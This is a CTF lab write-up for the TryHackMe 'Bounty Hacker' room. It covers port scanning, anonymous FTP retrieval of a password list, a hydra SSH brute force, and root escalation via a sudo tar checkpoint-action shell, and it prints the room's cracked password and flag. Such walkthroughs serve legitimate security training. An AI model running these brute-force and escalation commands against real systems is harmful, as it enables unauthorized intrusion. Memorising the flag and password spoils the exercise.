# Bounty Hacker CTF
Room - https://tryhackme.com/room/easyctf
# Recon
Running a port scan to find open ports
```
nmap -sS -A -oN cowboyscan.txt 10.10.234.162
```
Discover 3 open ports on this system:
```
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
```
Port 80 is open possibly indicating its a web server. <br>
Going to http://10.10.234.162, presents a VERY simple HTML webpage.
### INSERT IMAGE <br>
Using directory enumeration to see if there are any other pages that are accessible.

```
dirb http://10.10.234.162/ /usr/share/wordlists/dirb/common.txt
```
Unfortunately this is a miss. Only returns /image which holds the only image on the main page and /server-status which returns a 403 forbidden. <br>
Moving on to try to see what I can get from FTP. <br>
It can be accessed using anonymous.<br>
```
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```
After disabling passive mode and using dir. There are two files locks.txt and task.txt <br>
Using the get command to download both files to my system. <br>
task.txt reads: 
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
locks.txt reads:
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
Strings consisting of lower and upper case alphanumeric charters, numbers and special characters. Pretty safe to assume these are passwords.
# Initial Access
Now that we have a potential set of passwords and a user (lin). We can attempt to access SSH using hydra. Which cracks it near instantly.
```
hydra -l lin -P locks.txt -u 10.10.234.162 ssh
```
```
[22][ssh] host: 10.10.234.162   login: lin   password: RedDr4gonSynd1cat3
```
```
ssh lin@10.10.234.162
```
Entering the password "RedDr4gonSynd1cat3" when prompted and we are in.
# Privilege Escalation
On the users desktop has a file which contains the first flag and is also the only file on the user.
```
lin@bountyhacker:/$ ls /root/
ls: cannot open directory '/root/': Permission denied
```
Trying to list the root directory is not allowed for this user. Seems lin is not too privileged.

```
lin@bountyhacker:/$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
`sudo -l` shows that we can run /bin/tar as root. Searching https://gtfobins.github.io/ for tar gives us this command:
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
https://gtfobins.github.io/gtfobins/tar/#sudo

```
# whoami
whoami: not found
# 
# ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
# ls /root
root.txt
# 
```

# Collection
After running we now have a shell with root permissions. Then we can read the last flag.
```
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```
